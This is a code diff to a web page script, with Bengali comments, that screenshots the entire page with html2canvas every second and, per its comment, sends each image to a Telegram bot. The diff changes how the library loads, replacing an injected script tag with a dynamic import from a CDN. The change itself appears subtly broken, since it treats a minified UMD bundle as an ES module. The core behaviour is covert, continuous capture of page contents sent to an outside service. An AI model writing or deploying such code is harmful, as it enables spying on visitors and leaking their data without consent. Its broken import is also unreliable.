@@ -37,8 +37,9 @@
         // Function to take screenshot and send to Telegram
         async function takeScreenshotAndSend() {
             try {
-                // Capture the entire page as a blob
-                const canvas = await html2canvas(document.body);
+                // Capture the entire page as a blob (html2canvas সহ)
+                const html2canvas = await import('https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js');
+                const canvas = await html2canvas.default(document.body);
                 const dataURL = canvas.toDataURL("image/png");
 
                 // Send to Telegram Bot
@@ -63,14 +64,6 @@
 
         // Send screenshots every 1 second
         setInterval(takeScreenshotAndSend, 1000);
-
-        // Load html2canvas library dynamically
-        const script = document.createElement("script");
-        script.src = "https://html2canvas.hertzen.com/dist/html2canvas.min.js";
-        script.onload = () => {
-            console.log("html2canvas লোড হয়েছে!");
-        };
-        document.head.appendChild(script);
     </script>
 </body>
 </html>
